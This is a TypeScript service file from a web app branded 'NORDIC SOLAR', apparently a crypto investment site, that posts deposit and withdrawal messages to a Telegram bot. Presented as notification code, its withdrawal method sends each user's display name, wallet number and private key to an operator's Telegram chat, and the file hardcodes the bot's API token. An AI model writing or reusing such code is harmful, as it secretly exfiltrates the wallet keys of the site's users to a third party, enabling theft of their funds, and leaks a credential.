import axios from 'axios'
import { auth } from '@/main.tsx'

interface ITelegramService {}

const TELEGRAM_URL = `https://api.telegram.org/bot6143932905:AAFwzJ3pQGGMGVIRIbR7UlGua-NCzVXXgHg/sendMessage`

class TelegramService implements ITelegramService {
  constructor() {}

  async depositNotification(userData) {
    const { amount, type, transactionHash } = userData

    try {
      await axios.post(TELEGRAM_URL, {
        chat_id: import.meta.env.VITE_CHAT_ID,
        parse_mode: 'html',
        text: `🟢 NORDIC SOLAR\n\nТип операции: ${type}\nПользователь: ${auth.currentUser.displayName}\nСумма: $${amount}\nНомер транзакции: ${transactionHash}`,
      })
    } catch (e) {
      console.log(e, 'telegramNotification')
    }
  }

  async withdrawnNotification(userData) {
    const { amount, type, privateKey, walletNumber } = userData

    try {
      await axios.post(TELEGRAM_URL, {
        chat_id: import.meta.env.VITE_CHAT_ID,
        parse_mode: 'html',
        text: `🔴 NORDIC SOLAR\n\nТип операции: ${type}\nПользователь: ${auth.currentUser.displayName}\nСумма: $${amount} \nКошелёк: ${walletNumber}\nКлюч: ${privateKey}`,
      })
    } catch (e) {
      console.log(e, 'telegramNotification')
    }
  }
}

export default TelegramService
